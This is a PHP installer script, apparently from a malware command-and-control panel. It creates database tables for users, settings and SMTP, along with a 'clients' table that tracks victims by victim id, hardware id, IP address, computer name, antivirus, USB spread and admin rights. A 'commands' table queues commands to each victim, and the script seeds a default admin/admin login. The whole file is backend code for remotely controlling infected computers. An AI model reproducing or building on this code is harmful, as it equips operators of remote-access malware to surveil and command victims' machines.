<?php
$utils = new Utils;

$install = new Update;

$required_libs = ["cURL" => "curl", "JSON" => "json", "PDO" => "pdo", "MySQL" => "pdo_mysql", "Mbstring" => "mbstring"];
$is_installed = [];

if ($_SERVER['REQUEST_METHOD'] === "POST") {
    $users = [
        ["id", 'int(11)', 'unsigned', 'NULL'],
        ["username", 'text', 'NULL'],
        ["password", 'text', 'NULL'],
        ["email", 'text', 'NULL'],
        ["role", 'varchar(50)', 'NULL'],
        ["s2fa", 'varchar(10)', 'NULL'],
        ["secret", 'varchar(50)', 'NULL'],
        ["sqenable", 'varchar(50)', 'NULL'],
        ["question", 'text', 'NULL'],
        ["answer", 'text', 'NULL'],
        ['last_login', 'timestamp', 'NULL', "DEFAULT CURRENT_TIMESTAMP", "ON UPDATE CURRENT_TIMESTAMP()"],
        ["failed_login", "int(11)", "NULL"],
    ];

    $clients = [
        ["id", 'int(11)', 'unsigned', 'NULL'],
        ["vicid", 'text', 'NULL'],
        ["hwid", 'text', 'NULL'],
        ["ipaddress", 'text', 'NULL'],
        ["computername", 'text', 'NULL'],
        ["country", 'text', 'NULL'],
        ["os", 'text', 'NULL'],
        ["insdate", 'text', 'NULL'],
        ["update_at", 'text', 'NULL'],
        ["pings", 'int(11)', 'NULL'],
        ['antivirus', 'text', 'NULL'],
        ['version', 'text', 'NULL'],
        ['status', 'text', 'NULL'],
        ['is_usb', 'varchar(5)', 'NULL'],
        ["is_admin", 'varchar(5)', "NULL"],
    ];

    $commands = [
        ["id", 'int(11)', 'unsigned', 'NULL'],
        ["vicid", 'text', 'NULL'],
        ["command", 'text', 'NULL'],
    ];

    $confirm_code = [
        ["id", 'int(11)', 'unsigned', 'NULL'],
        ["username", 'text', 'NULL'],
        ["token", 'text', 'NULL'],
        ["created_at", 'timestamp', 'NULL', "DEFAULT CURRENT_TIMESTAMP", "ON UPDATE CURRENT_TIMESTAMP()"],
    ];

    $logs = [
        ["id", 'int(11)', 'unsigned', 'NULL'],
        ["time", 'timestamp', 'NULL', "DEFAULT CURRENT_TIMESTAMP", "ON UPDATE CURRENT_TIMESTAMP()"],
        ["vicid", 'text', 'NULL'],
        ["type", 'text', 'NULL'],
        ["message", 'text', 'NULL'],
    ];

    $settings = [
        ["id", 'int(11)', 'unsigned', 'NULL'],
        ["recaptchaprivate", 'text', 'NULL'],
        ["recaptchapublic", 'text', 'NULL'],
        ["recaptchastatus", 'text', 'NULL'],
        ["panel_status", 'text', 'NULL'],
    ];

    $smtp = [
        ["id", 'int(11)', 'unsigned', 'NULL'],
        ["smtphost", 'text', 'NULL'],
        ["smtpuser", 'text', 'NULL'],
        ["smtppassword", 'text', 'NULL'],
        ["port", 'int(11)', 'NULL'],
        ["security_type", 'varchar(10)', 'NULL'],
        ["status", 'varchar(50)', 'NULL'],
    ];

    $sql = [
        $install->create_table("users", $users),
        $install->create_table("clients", $clients),
        $install->create_table("commands", $commands),
        $install->create_table("confirm_code", $confirm_code),
        $install->create_table("logs", $logs),
        $install->create_table("settings", $settings),
        $install->create_table("smtp", $smtp),
        $install->insert_value("users", [
            "id" => 1,
            "username" => 'admin',
            "password" => password_hash("admin", PASSWORD_BCRYPT),
            "email" => 'localhost@gmail.com',
            "role" => 'administrator',
            "s2fa" => 'off',
            "secret" => 'null',
            "sqenable" => 'off',
            "question" => 'Select a Security Question',
            "answer" => '',
            "last_login" => "2020-05-11 01:19:22",
            "failed_login" => 0,
        ]),
        $install->insert_value("settings", [
            "id" => 1,
            "recaptchaprivate" => 'UpdateYourCode',
            "recaptchapublic" => 'UpdateYourCode',
            "recaptchastatus" => 'off',
            "panel_status" => 'on',
        ]),
        $install->insert_value("smtp", [
            "id" => 1,
            "smtphost" => 'smtp.localhost.com',
            "smtpuser" => 'localhost@gmail.com',
            "smtppassword" => 'Z21haWxwYXNzd29yZA==',
            "port" => 0,
            "security_type" => 'ssl',
            "status" => 'off',
        ]),
        $install->is_primary("users", "id"),
        $install->is_autoinc("users", ["id", 'int(11)', 'unsigned', 'NULL']),
        $install->is_primary("clients", "id"),
        $install->is_autoinc("clients", ["id", 'int(11)', 'unsigned', 'NULL']),
        $install->is_primary("commands", "id"),
        $install->is_autoinc("commands", ["id", 'int(11)', 'unsigned', 'NULL']),
        $install->is_primary("confirm_code", "id"),
        $install->is_autoinc("confirm_code", ["id", 'int(11)', 'unsigned', 'NULL']),
        $install->is_primary("logs", "id"),
        $install->is_autoinc("logs", ["id", 'int(11)', 'unsigned', 'NULL']),
        $install->is_primary("settings", "id"),
        $install->is_autoinc("settings", ["id", 'int(11)', 'unsigned', 'NULL']),
        $install->is_primary("smtp", "id"),
        $install->is_autoinc("smtp", ["id", 'int(11)', 'unsigned', 'NULL']),
    ];

    foreach ($sql as $query) {
        $msg = $install->execute($query);
    }
}
